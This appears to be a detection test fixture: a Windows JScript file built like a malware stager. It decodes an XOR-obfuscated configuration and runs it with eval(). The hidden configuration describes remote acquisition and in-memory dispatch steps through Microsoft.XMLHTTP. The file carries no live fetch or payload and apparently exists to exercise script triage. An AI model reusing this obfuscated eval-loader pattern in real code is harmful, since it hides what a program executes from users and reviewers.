// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_ea92fd11(storedMaterial) {
  var recoveredMaterial = [];
  var previous = 119;
  for (var i = 0; i < storedMaterial.length; i++) { recoveredMaterial.push(storedMaterial[i] ^ previous); previous = storedMaterial[i]; }
  return recoveredMaterial;
}
function recover_cbe113f3() {
  var characters = [12,46,93,41,76,60,79,109,87,12,46,79,44,93,40,65,51,86,9,123,30,115,28,104,13,47,3,33,69,44,95,47,78,58,89,49,110,3,102,11,100,22,111,77,16,60,30,127,27,122,10,126,27,105,75,113,83,30,119,20,102,9,122,21,115,7,41,113,60,112,56,108,56,104,74,102,68,50,83,63,74,47,92,126,68,63,29,126,31,114,2,99,10,109,3,92,53,81,115,73,107,8,105,4,116,21,124,27,117,88,109,9,63,89,96,88,111,86,48,84,118,90,120,13,127,19,49,11,41,65,53,65,49,66,120,87,120,77,41,31,121,64,120,79,118,16,116,90,63,71,38,75,59,87,50,28,117,27,109,12,96,9,109,66,116,65,119,79,44,77,125,73,103,3,98,22,52,24,58,79,60,89,43,116,21,114,23,121,13,47,21,55,127,10,100,16,98,7,116,7,75,42,72,103,82,54,0,102,95,103,80,105,15,107,73,52,24,58,73,61,92,59,94,29,114,7,105,29,63,5,55,74];

  var storedMaterial = [];

  for (var ci = 0; ci < characters.length; ci++) { storedMaterial.push(characters[ci]); }

  var harmlessValue = (2 > 1) ? "left" : "right";

  var recoveredMaterial = [];

  for (var pass = 0; pass < 1; pass++) { recoveredMaterial = decode_ea92fd11.apply(null, [storedMaterial]); }

  var textParts;

  textParts = [];

  for (var bi = 0; bi < recoveredMaterial.length; bi++) { textParts.push(String.fromCharCode(recoveredMaterial[bi])); }

  var configurationText = textParts.join("");

  return configurationText;
}
function inspect_5c47da2c() {
  var configuration = eval("(" + recover_cbe113f3.apply(null, []) + ")");
  var table = { steps: function() { return configuration.steps; }, values: function() { return configuration.values; } };
  return { steps: table.steps.apply(null, []), adapter: configuration["adapter"], values: table["values"].apply(null, []), stageCount: configuration["stageCount"] };
}
